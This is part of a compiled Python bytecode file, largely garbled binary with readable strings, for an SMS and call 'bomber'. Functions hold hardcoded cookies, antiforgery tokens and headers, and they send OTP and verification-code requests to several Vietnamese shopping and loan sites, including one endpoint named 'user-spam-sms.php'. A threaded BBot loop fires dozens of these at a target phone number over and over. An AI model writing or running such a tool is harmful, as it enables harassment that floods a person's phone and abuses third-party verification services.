ddddd�}ddddddddddddddd�}| dddd�}t          j        d |||�!�  �        }d S )"Na$  %7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7Dz�CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgEzGA1.2.2106570071.1685151972z&GS1.1.1685151972.1.0.1685151972.60.0.0zGA1.1.2004811826.1685151972zfb.1.1685151972814.1550382232r�   zTv~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940zbeline2686|ZHFg6|ZHFg5z-113%2C14.225.211.123%2C1�5MoF_IoMgcKATLRi4lIvjOVPQrdzvid|eadd7b088636140f774e)�DMX_Personalz#.AspNetCore.Antiforgery.UMd7_MFqVbsr�   �_ga_TLRZMSX5MEr�   r�   �cebsz_ce.sz_ce.clock_event�SvIDz_ce.clock_data�cebsp_rT  rU  �lhc_perzwww.thegioididong.comr   r�   rG  zhttps://www.thegioididong.comz8https://www.thegioididong.com/lich-su-mua-hang/dang-nhapr�   r�   r�   r�   r�   r   r�   r&   r^  r�  z�CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s)r.   �isReSend�sendOTPType�__RequestVerificationTokenzDhttps://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCoder'  r�   r(  s        r:   �tgddr8  �  s�   � � � 0M�-�B�,�/��g��(�5�� �-�-�� �G�& -��U�J�1�M�X� �)�!� �'� H�,�� �G�& ��� 'D�	� �D� �}�N����	� � �H�H�Hr<   c                 �   � dddd�}i dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�}| d%d&d'�}t          j        d|||�(�  �        }d S ))N�GA1.1.355569834.1685331326z�%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%228770872279147596%22%2C%22sessionId%22%3A%227025862886191853%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7Dz%GS1.1.1685331326.1.1.1685331343.0.0.0)r�   �_hp2_id.758475466�_ga_LKETQQ110Jr�   �onlytrislua.x10.mxr#   r  r$   r�   r  r  r�   r  r�   �https://onlytrislua.x10.mxr�   z.https://onlytrislua.x10.mx/s/user-spam-sms.phpr�   r�   r�   r�   r�   r�   r�   r  r�   r  r�   r   r!  r�   r"  r�   r   r�   �493�TRTS)r   �	server_idr&  r'  r�   r(  s        r:   �apiv2rB  #  s$  � �+� ]�A�� �G���)���  \�� 	�U�� 	��	�
 	�;�� 	�.�� 	�C�� 	�X�� 	�D�� 	�k�� 	�*�� 	�*�� 	�-�� 	�$��  	$�S�!�" 	�  H�#�G�* ���� �D� �}�M�W^�ho�vz�{�{�{�H�H�Hr<   c                 �   � dddddd�}i dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�}| dd'd(�}t          j        d|||�)�  �         d S )*Nr:  zY%7B%22ts%22%3A1685616159432%2C%22d%22%3A%22onlytrislua.x10.mx%22%2C%22h%22%3A%22%2F%22%7Dz�%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%225407290981034883%22%2C%22sessionId%22%3A%22627390060443876%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7Dz%GS1.1.1685616159.3.1.1685616694.0.0.0r  )r�   z_hp2_ses_props.758475466r;  r<  r  r�   r=  r#   r  r$   r�   r  r  r�   r  r�   r>  r�   z9https://onlytrislua.x10.mx/download/user-vip-spam-sms.phpr�   r�   r�   r�   r�   r�   r�   r  r�   r  r�   r   r!  r�   r"  r�   r   r�   r@  r$  r'  r�   r�  s       r:   �apiv3rD  F  s-  � �+�$� \�A�%�� �G���)���  \�� 	�U�� 	��	�
 	�;�� 	�.�� 	�N�� 	�X�� 	�D�� 	�k�� 	�*�� 	�*�� 	�-�� 	�$��  	$�S�!�" 	�  H�#�G�* �#��� �D� �M�M�W^�ho�vz�{�{�{�{�{�{r<   c                 �n   � dddddd�}ddd	d
dddddddddd�}d| i}t          j        d|||��  �        }d S �NzGA1.2.1019704199.1688123462r�   z&GS1.1.1688123461.1.1.1688123540.56.0.0zGA1.1.313940094.1688123462z%GS1.2.1688123462.1.1.1688123540.0.0.0)r�   z_gat_UA-214880719-1�_ga_RRJDDZGPYGr�   �_ga_7ZDGMGYGRGr�  r   r'   r�   r�  r�  r�   r�   r�   r�   r�   r�   r�   r�  r   r�  r�   r�   r�   s        r:   �callv10rI  j  �   � �-�"�B�+�A�� �G� '���*�'�3�X� �)�!� �%� H�� �G�$ 	���I� �}�A����	� � �H�H�Hr<   c                 �z   � ddddddddd	�}d
ddddddddddddd�}| dddd�}t          j        d|||��  �        }d S )Nz1.1.2046735143.1688124277zGA1.3.324859919.1688124278r�   �wn86kpVMWDe_EJy2p8BRWhxLKeyzGA1.1.76499769.1688124278r%   z6eyJzaG93IjpmYWxzZSwiaGVpZ2h0IjpudWxsLCJyaWdodCI6MH0%3Dz%GS1.1.1688124278.1.1.1688124300.0.0.0)r�   r�   rT  rU  r�   �
_acbswcu_l�_acbswcu_stateData�_ga_MTBX8SYKKDzapp.tienoi.com.vnr�   r  r�   zhttps://app.tienoi.com.vnz@https://app.tienoi.com.vn/auth/registration?need=2000000&days=14r�   r�   r�   r�   r�   r   r�   r�  �A123456789aT)rz  r�   �passwordConfirmation�
isVoiceSmszHhttps://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCoder�   r�   r�   s        r:   �callv11rS  �  s�   � �.�,� �-�*��V�A�	� 	�G� )�5�^�*�-�U�X� �)�!� �'� H�� �G�$ �!� -��	� �I� �}�R����	� � �H�H�Hr<   c                 �n   � dddddd�}ddd	d
dddddddddd�}d| i}t          j        d|||��  �        }d S rF  r�   r�   s        r:   �callv12rU  �  rJ  r<   c                  �   � 	 t          t          �  �         t          j        d�  �         t	          t
          �  �        D ]} t          �   �          ��N�NTr   )r�   r   rV   r   r3   �amount�exit)�bs    r:   �sendmmr[  �  sD   � �
��u�+�+�+��*�Q�-�-�-���=�=� 
� 
�a��6�6�6�6�	
r<   c                 �   � 	 t          | �  �         t          j        d�  �         t          t          �  �        D ]}t          �   �          ��IrW  )rv  rV   r   r3   rX  rY  )r   rZ  s     r:   �	sendcall1r]  �  sD   � �
���,�,�,��*�Q�-�-�-���=�=� 
� 
�a��6�6�6�6�	
r<   c                 �T  � t          |�  �        D �]�}t          j        t          �  �         t	          j        d�  �         t          j        t          | �  �         t          j        t          | �  �         t          j        t          | �  �         t          j        t          | �  �         t	          j        d�  �         t          j        t          | �  �         t	          j        d�  �         t          j        t          | �  �         t	          j        d�  �         t          j        t          | �  �         t	          j        d�  �         t          j        t          | �  �         t	          j        d�  �         t          j        t          | �  �         t          j        t          | �  �         t          j        t           | �  �         t          j        t"          | �  �         t          j        t$          | �  �         t          j        t&          | �  �         t          j        t(          | �  �         t          j        t*          | �  �         t          j        t,          | �  �         t          j        t.          | �  �         t          j        t0          | �  �         t          j        t2          | �  �         t	          j        d�  �         t          j        t4          | �  �         t          j        t6          | �  �         t          j        t8          | �  �         t          j        t:          | �  �         t          j        t<          | �  �         t          j        t>          | �  �         t          j        t@          | �  �         t          j        tB          | �  �         t          j        tD          | �  �         t          j        tF          | �  �         t          j        tH          | �  �         t          j        tJ          | �  �         t          j        tL          | �  �         t	          j        d�  �         t          j        tN          | �  �         t          j        tP          | �  �         t          j        tR          | �  �         t          j        tT          | �  �         t          j        tV          | �  �         t          j        tX          | �  �         t          j        tZ          | �  �         t          j        t\          | �  �         t          j        t^          | �  �         t          j        t`          | �  �         t          j        tb          | �  �         t          j        td          | �  �         t          j        tf          | �  �         t	          j        d�  �         t          j        th          | �  �         ���d S )Nr   )5r3   �	threadingr@  r[  rV   r   r)  r=  r�   r]  r{  r}  r�  r�  rI  r  r�   r�   r�  rB  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r
  rD  rD  rS  rj  r  r�   r�  r�  r�  r	  r9  r  rr  r�  rU  rI  r  rL   r(  r,  r�  r8  )r   rX  r9   s      r:   �BBotr`  �  s(  � �
��-�-� 9� 9�Q���6�����*�Q�-�-�-���4�������5�������3�u������9�U�#�#�#��*�Q�-�-�-���5������*�Q�-�-�-���5������*�Q�-�-�-���5������*�Q�-�-�-���5������*�Q�-�-�-���7�5�!�!�!���4�������4�������3�u������7�5�!�!�!���5�������7�5�!�!�!���9�U�#�#�#���8�E�"�"�"���9�U�#�#�#���6�%� � � ���5������*�Q�-�-�-���7�5�!�!�!���7�5�!�!�!���6�%� � � ���7�5�!�!�!���6�%� � � ���5�������9�U�#�#�#���7�5�!�!�!���4�������5�������6�%� � � ���4�������6�%� � � ��*�Q�-�-�-���5�������6�%� � � ���6�%� � � ���4�������3�u������2�e������7�5�!�!�!���3�u������4�������5�������7�5�!�!�!���4�������6�%� � � ��*�Q�-�-�-���4������s9� 9r<   )orD   �urllib.request�urllib�uuidrE   �hmacr_  �concurrent.futuresr   �hashlibr4   rV   r   �bs4�base64r   �os�sys�rer   r   r   r	   �system�trang�xanh_la�
xanh_duong�do�vang�tim�mau_dac_biet�daur�   �bannerr�   �stdout�write�flush�inputr   r�   rX  �uuid4rl   r�   r  rJ   �l_phone�printrY  r@   r?   �strr  r  r;   rL   r�   r�   r�   r�   r�   r�   r�   r�   r	  r  r)  r9  r�   rD  rI  rj  rr  rv  r{  r}  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r
  r  r=  r  r  r(  r,  r8  rB  rD  rI  rS  rU  r[  r]  r`  r�   r<   r:   �<module>r~     s	  �� ���� � � � � ���� ���� ���� ���� � � � � 1� 1� 1� 1� 1� 1� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � ���� &� &� &� &� &� &� &� &� &� &� &� &� &� &� &� &� &� &� &� &� ���� � � � � � � +� +� +� +� +� +� +� +� +� +� 	��	�'� � � ���
���
�������0��9��
� 
� 
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� (4�
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� .3�
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� �
� 
� 
� 
� !�
� 
� 
� 
� ,1�
� 
� 
� 
� 
� 
��$ 
� � �A�
�z�������
�z�������u�U�|�|�|�|���m�n�n��	��U�U�s�t�t�	u�	u����3�3�v�;�;�7�7�7�	��t�z�|�|���  J�  L�������	�u�Q�r�T�{�	�� �	� l�
k�
k���G���	�E�
'�(�(�(��D�F�F�F� 	� Q������
��-�]���� �� �#�e�A�b�D�k�/�	*���
���D�	�	�$����;�=� =�� �%�
 ��� � �i� i� i�
k� k� k�X3� 3� 3�=� =� =�x� x� x�x� x� x�S� S� S�d� d� d�*y� *y� *y�V� � �J	� J	� J	�"h� "h� "h�FO� O� O�$h� $h� $h�JJ� J� J�e
� e
� e
�>� >� >�~y� y� y�	� 	� 	�\
� \
� \
�n� n� n�F� F� F�
x� x� x�
B� B� B�HQ� Q� Q�I� I� I�i� i� i�e� e� e�]� ]� ]�
q� q� q�k� k� k�
# � # � # �Jr� r� r�
C� C� C�
o� o� o�
0� 0� 0�dm� m� m�
q� q� q�s� s� s�@� @� @�i� i� i�� � �x� x� x�n� n� n�'~� '~� '~�R q�  q�  q�D1� 1� 1�f!|� !|� !|�F#|� #|� #|�H#� #� #�R)� )� )�h#� #� #�R
� 
� 
�
� 
� 
�:� :� :�x ��U�F� � � � � r<   